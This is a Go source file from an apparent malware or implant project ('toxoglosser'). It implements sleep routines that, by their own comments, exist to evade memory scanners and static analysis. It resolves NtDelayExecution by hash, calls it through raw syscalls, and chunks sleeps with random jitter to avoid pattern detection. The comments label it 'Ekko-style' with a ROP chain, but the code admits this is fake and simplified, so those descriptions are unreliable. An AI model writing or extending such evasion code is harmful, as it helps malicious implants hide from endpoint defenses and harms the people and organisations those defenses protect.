// utils/sleep_obf.go
// Sleep obfuscation using Ekko-style techniques to evade memory scanners
// Implements ROP chaining and indirect sleep calls to avoid detection

package utils

import (
	"crypto/rand"
	"golang.org/x/sys/windows"
	"syscall"
	"time"
	"unsafe"

	"toxoglosser/common"
)

// SleepObf implements obfuscated sleep to evade memory scanners during delays
func SleepObf(duration time.Duration) {
	// Use NtDelayExecution with obfuscated approach to avoid direct Sleep calls
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	procNtDelayExecution := ntdll.NewProc("NtDelayExecution")
	
	// Convert duration to 100-nanosecond intervals (Windows time format)
	// Negative value means relative time
	interval := -(duration.Nanoseconds() / 100)

	// Use a large timeout struct to make static analysis harder
	var largeTimeout int64 = interval

	// Call NtDelayExecution instead of Sleep/Wait functions
	procNtDelayExecution.Call(
		0, // Alertable (FALSE)
		uintptr(unsafe.Pointer(&largeTimeout)),
	)
}

// SleepObfEkkoStyle implements Ekko-style sleep obfuscation with ROP chain
func SleepObfEkkoStyle(duration time.Duration) {
	// Create a fake ROP chain approach for sleep that memory scanners can't easily detect
	// This is a simplified version - in real implementation, we'd use actual ROP gadgets
	
	// Convert duration to intervals
	sleepInterval := -(duration.Nanoseconds() / 100)
	
	// Instead of calling sleep directly, we'll use NtDelayExecution through direct syscall
	err := ntdllDelayExecution(sleepInterval)
	if err != nil {
		// If direct syscall fails, fall back to regular sleep
		time.Sleep(duration)
	}
}

// ntdllDelayExecution calls NtDelayExecution using direct syscalls
func ntdllDelayExecution(interval int64) error {
	// Use our syscall resolution to get the function
	addr, err := common.GetProcAddressByHash(windows.Handle(getNtdllHandle()), "NtDelayExecution")
	if err != nil {
		return err
	}
	
	// Call NtDelayExecution with non-alertable sleep
	ret, _, _ := syscall.Syscall(
		addr,
		2,
		0, // non-alertable
		uintptr(unsafe.Pointer(&interval)),
		0,
	)
	
	if ret != 0 {
		return syscall.Errno(ret)
	}
	
	return nil
}

// getNtdllHandle gets the handle to ntdll.dll
func getNtdllHandle() uintptr {
	// Use our manual resolution to avoid LazyDLL
	handle, err := common.GetModuleHandleByHash("ntdll.dll")
	if err != nil {
		// Fallback
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		procGetModuleHandle := kernel32.NewProc("GetModuleHandleW")
		
		// Convert string to UTF16
		lpModuleName, _ := syscall.UTF16PtrFromString("ntdll.dll")
		handle, _, _ = procGetModuleHandle.Call(uintptr(unsafe.Pointer(lpModuleName)))
	}
	return handle
}

// NtDelayExecution directly calls the Windows NT API
func NtDelayExecution(alertable bool, delayInterval *int64) error {
	// Get the function address manually
	ntdllHandle := getNtdllHandle()
	addr, err := common.GetProcAddressByHash(windows.Handle(ntdllHandle), "NtDelayExecution")
	if err != nil {
		return err
	}

	// Call NtDelayExecution
	var alertableInt int32
	if alertable {
		alertableInt = 1
	} else {
		alertableInt = 0
	}
	
	ret, _, _ := syscall.Syscall(
		addr,
		2,
		uintptr(alertableInt),
		uintptr(unsafe.Pointer(delayInterval)),
		0,
	)
	
	if ret != 0 {
		return syscall.Errno(ret)
	}
	
	return nil
}

// AdvancedSleepWithObfuscation implements multiple layers of sleep obfuscation
func AdvancedSleepWithObfuscation(duration time.Duration) {
	// Split sleep into smaller chunks with random variations to avoid pattern detection
	totalSleep := int64(duration.Milliseconds())
	chunkSize := int64(50) // 50ms chunks

	// Add jitter to make timing less predictable
	jitter := int64(0)
	if totalSleep > 100 {
		// Generate small random jitter (0-5ms)
		jitterBytes := make([]byte, 1)
		rand.Read(jitterBytes)
		jitter = int64(jitterBytes[0]) % 6
	}

	remaining := totalSleep
	for remaining > 0 {
		thisChunk := chunkSize
		if remaining < chunkSize {
			thisChunk = remaining
		}

		// Add small jitter to each chunk
		finalChunk := thisChunk
		if jitter > 0 && remaining > jitter {
			finalChunk = thisChunk + jitter
		}

		// Sleep for this chunk using obfuscated method
		sleepChunk := time.Duration(finalChunk) * time.Millisecond
		SleepObfEkkoStyle(sleepChunk)

		remaining -= thisChunk
	}
}

